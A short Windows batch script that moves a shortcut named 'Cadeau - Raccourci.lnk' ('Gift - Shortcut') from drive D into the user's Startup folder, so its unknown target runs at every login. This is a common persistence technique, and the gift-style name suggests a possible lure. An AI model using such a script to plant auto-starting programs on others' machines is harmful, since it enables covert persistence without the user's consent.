@echo off
set "shortcutPath=D:\Cadeau - Raccourci.lnk"

rem Get the current user's startup folder location
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Move the shortcut to the startup folder
move "%shortcutPath%" "%startupFolder%"
